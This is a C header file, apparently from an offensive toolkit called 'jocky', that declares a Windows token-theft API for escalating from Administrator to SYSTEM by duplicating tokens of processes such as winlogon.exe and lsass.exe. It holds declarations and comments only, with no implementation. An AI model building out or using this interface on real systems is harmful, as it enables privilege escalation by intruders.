#ifndef JOCKY_TOKEN_MANIPULATION_H
#define JOCKY_TOKEN_MANIPULATION_H

#include <windows.h>
#include <stdint.h>

/* Token Manipulation API
 *
 * Implements token theft/duplication for privilege escalation:
 * - Locate SYSTEM processes (winlogon.exe, services.exe, lsass.exe)
 * - Duplicate SYSTEM tokens
 * - Apply tokens to current process or spawn new process
 * - Enables Administrator → SYSTEM escalation
 */

typedef struct {
    uint32_t pid;
    WCHAR process_name[256];
    uint8_t is_system;
} TOKEN_PROCESS_INFO;

/* Find processes running as SYSTEM (common targets) */
int jocky_find_system_process(
    const char* preferred_process,
    TOKEN_PROCESS_INFO* out_info
);

/* Locate SYSTEM processes by name pattern */
int jocky_enum_system_processes(
    TOKEN_PROCESS_INFO* processes,
    int max_count,
    int* out_count
);

/* Open process and duplicate its token */
HANDLE jocky_duplicate_process_token(
    uint32_t source_pid,
    uint32_t desired_access
);

/* Impersonate a token (threads inherit it) */
int jocky_impersonate_token(HANDLE token);

/* Spawn new process with duplicated SYSTEM token */
int jocky_spawn_as_system(
    const char* command_line,
    const char* source_process,
    uint32_t* out_pid
);

/* Elevate current process to SYSTEM (if token available) */
int jocky_elevate_to_system(HANDLE system_token);

/* Get current process token */
HANDLE jocky_get_current_token(uint32_t desired_access);

/* Check if current process is running as SYSTEM */
int jocky_is_system_user(void);

/* Check if current process has Administrator privileges */
int jocky_is_admin(void);

/* Restore original token (cleanup) */
int jocky_restore_original_token(void);

#endif
